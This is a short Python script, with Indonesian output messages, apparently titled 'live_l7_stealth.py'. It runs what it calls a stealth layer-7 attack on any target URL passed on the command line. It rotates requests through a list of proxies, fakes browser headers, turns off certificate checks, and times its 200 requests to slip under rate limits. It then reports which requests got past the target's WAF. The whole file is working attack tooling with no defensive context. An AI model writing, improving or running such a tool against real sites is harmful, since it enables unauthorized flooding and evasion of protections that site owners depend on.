import time
import concurrent.futures
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def attack_worker(target_url, proxy, req_id):
    # Setup HTTP/HTTPS proxy
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }
    
    try:
        resp = requests.get(target_url, proxies=proxies, headers=headers, timeout=5, verify=False)
        if resp.status_code in [200, 301, 302]:
            print(f"[*] Node {proxy.split(':')[0]} | Req {req_id}:[{resp.status_code} OK] -> Tembus")
        else:
            print(f"[!] Node {proxy.split(':')[0]} | Req {req_id}: [{resp.status_code}] -> WAF Block/Error")
    except Exception as e:
        print(f"[-] Node {proxy.split(':')[0]} | Req {req_id}: [RTO] -> Koneksi Gagal")

def load_proxies(filename="proxies.txt"):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        print("File proxies.txt tidak ditemukan.")
        sys.exit(1)

def run_live_stealth(target_url):
    proxy_pool = load_proxies()
    if not proxy_pool:
        sys.exit(1)
        
    estimated_refill_rate = 1 
    safe_delay = 1.0 / (len(proxy_pool) * estimated_refill_rate)
    
    print(f"[>] Menginisiasi Live Stealth L7 pada {target_url}")
    print(f"[>] Rotasi {len(proxy_pool)} Node | Kalkulasi Delay: {safe_delay}s")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(proxy_pool)) as executor:
        futures =[]
        for i in range(1, 201):
            current_proxy = proxy_pool[i % len(proxy_pool)]
            futures.append(executor.submit(attack_worker, target_url, current_proxy, i))
            time.sleep(safe_delay)
            
        concurrent.futures.wait(futures)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Penggunaan: python3 live_l7_stealth.py <https://target.com>")
        sys.exit(1)
    run_live_stealth(sys.argv[1])